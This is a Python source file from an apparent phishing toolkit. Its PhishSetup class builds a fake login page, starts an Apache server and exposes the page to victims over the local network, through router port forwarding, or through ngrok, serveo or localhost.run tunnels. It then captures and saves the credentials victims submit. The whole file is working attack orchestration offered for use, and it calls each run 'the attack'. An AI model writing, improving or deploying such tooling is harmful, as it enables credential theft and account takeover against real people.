import subprocess
import os
import time
import ngrok # type: ignore
import multiprocessing
from sources import Sources
from phish_create import PhishCreate
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET

class PhishSetup:
    def __init__(self):
        self.phishcreate = PhishCreate()
        self.sources = Sources()
        self.wireless_adaptor = self.sources.selectadapter()
        self.ip_address = self.sources.get_ip_address(self.wireless_adaptor) 

    def setup_within_network(self):
        try:
            os.system("clear")
            self.phishcreate.setup_phish_page()
            self.start_server()
            os.system("clear")
            print(f"{BLUE}[===] URL:{RESET}  {GREEN}http://{self.ip_address}/{RESET}")
            self.sources.capture_logins(self.phishcreate.login_data_file_path)
        except KeyboardInterrupt:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        else:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()

    def setup_with_port_forwarding(self):
        try:
            os.system("clear")
            print(f"{BLUE}[!] Place your internal IP address={self.ip_address} and Port=80 for port forwarding in router setting.........\n")
            check_port_forwarding = input(f"{GREEN}[?] After port forwarding in router setting, press 'y' to start the attack --> {RESET}")
            if check_port_forwarding == "y":
                os.system("clear")
                self.phishcreate.setup_phish_page()
                self.start_server()
                os.system("clear")
                print(f"{BLUE}[===] URL:{RESET}  {GREEN}http://{self.sources.get_external_ip()}:80/{RESET}")
                print(f"\n{RED}[!!] Make sure you did the port forwarding in router settngs...")
                self.sources.capture_logins(self.phishcreate.login_data_file_path)
        except KeyboardInterrupt:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        else:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
                                         

    def setup_with_localhost_run(self):
        try:
            os.system("clear")
            key_name = self.sources.generate_ssh_key()
            self.phishcreate.setup_phish_page()
            self.start_server()
            os.system("clear")
            port_forward_process = multiprocessing.Process(target=self.sources.port_forward_using_localhostrun, args=(key_name,))
            port_forward_process.start()
            print(f"{RED}[--] Wait for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            self.sources.capture_logins(self.phishcreate.login_data_file_path)
        except KeyboardInterrupt:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        else:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
                                         
    

    def setup_with_ngrok(self):
        token_config = 0
        while token_config == 0:
            files_list = self.sources.list_files(f"{os.getcwd()}/src")
            os.system("clear")
            if "ngrok_authtoken" in files_list:
                with open(f"{os.getcwd()}/src/ngrok_authtoken", 'r') as file:
                    file_content = file.read()
                if file_content == "" or file_content == " " or file_content == "\n":
                    token = input("[?] Provide the token for ngrok. Sign up on ngrok website to get one. (Auth-token)--> ")
                    if token == "" or token == " ":
                        pass
                    else:
                        token_config = 1
                        with open(f"{os.getcwd()}/src/ngrok_authtoken", 'w') as file:
                            file.write(token)
                else:
                    token = file_content.replace("\n","").replace(" ","")
                    print(f"[+] Auth-Token already configured --> '{token}'")
                    change_token = input("Do you want to change auth-token. Type 'y' to change --> ").lower()
                    if change_token == "y":
                        token = input("[?] Provide the token for ngrok. Sign up on ngrok website to get one. (Auth-token)--> ")
                        if token == "" or token == " ":
                            pass
                        else:
                            token_config = 1
                            with open(f"{os.getcwd()}/src/ngrok_authtoken", 'w') as file:
                                file.write(token)
                    token_config = 1
            else:
                token = input("[?] Provide the token for ngrok. Sign up on ngrok website to get one. (Auth-token)--> ")
                if token == "" or token == " ":
                    pass
                else:
                    token_config = 1
                    with open(f"{os.getcwd()}/src/ngrok_authtoken", 'w') as file:
                        file.write(token)

        if token_config == 1:
            try:
                os.system("clear")
                self.phishcreate.setup_phish_page()
                self.start_server()
                os.system("clear")
                port = self.sources.port_apache
                listener = ngrok.forward(port,authtoken=token)
                print(f"{BLUE}URL -->{RESET} {GREEN}{listener.url()}{RESET}")
                self.sources.capture_logins(self.phishcreate.login_data_file_path)
            except KeyboardInterrupt:
                print("\n\n[-] Closing Server and Capturing....")
                if self.phishcreate.login_data_file_path != "":
                    self.sources.saving_captured(self.phishcreate.login_data_file_path)
                self.stop_server()
                ngrok.disconnect()
            except Exception as e:
                print(f"{RED}\n[-] Following error occur:-->{RESET}")
                print(f"{RED}[-] Error maybe due to wrong ngrok auth-token. Check your auth-token and place correct auth-token in order to make this attack work.{RESET} ")
                print("\n\n[-] Closing Server and Capturing....")
                if self.phishcreate.login_data_file_path != "":
                    self.sources.saving_captured(self.phishcreate.login_data_file_path)
                self.stop_server()
                ngrok.disconnect()
            else:
                print("\n\n[-] Closing Server and Capturing....")
                if self.phishcreate.login_data_file_path != "":
                    self.sources.saving_captured(self.phishcreate.login_data_file_path)
                self.stop_server()
                ngrok.disconnect()


    def setup_with_serveo(self):
        try:
            os.system("clear")
            key_name = self.sources.generate_ssh_key()
            self.phishcreate.setup_phish_page()
            self.start_server()
            os.system("clear")
            port_forward_process = multiprocessing.Process(target=self.sources.port_forward_using_serveo, args=(key_name,))
            port_forward_process.start()
            print(f"{RED}[--] Wait for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
            self.sources.capture_logins(self.phishcreate.login_data_file_path)
        except KeyboardInterrupt:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        except Exception as e:
            print(f"{RED}\n[-] Following error occur:-->{RESET}")
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()
        else:
            print("\n\n[-] Closing Server and Capturing....")
            if self.phishcreate.login_data_file_path != "":
                self.sources.saving_captured(self.phishcreate.login_data_file_path)
            self.stop_server()



    def start_server(self):
        result = subprocess.run(f"a2enmod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{GREEN}[+] Starting Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 start", shell=True, capture_output=True, text=True)
        print(result.stderr)
    def stop_server(self):
        result = subprocess.run(f"a2dismod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{RED}[-] Stopping Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 stop", shell=True, capture_output=True, text=True)
        print(result.stderr)

    
        
        
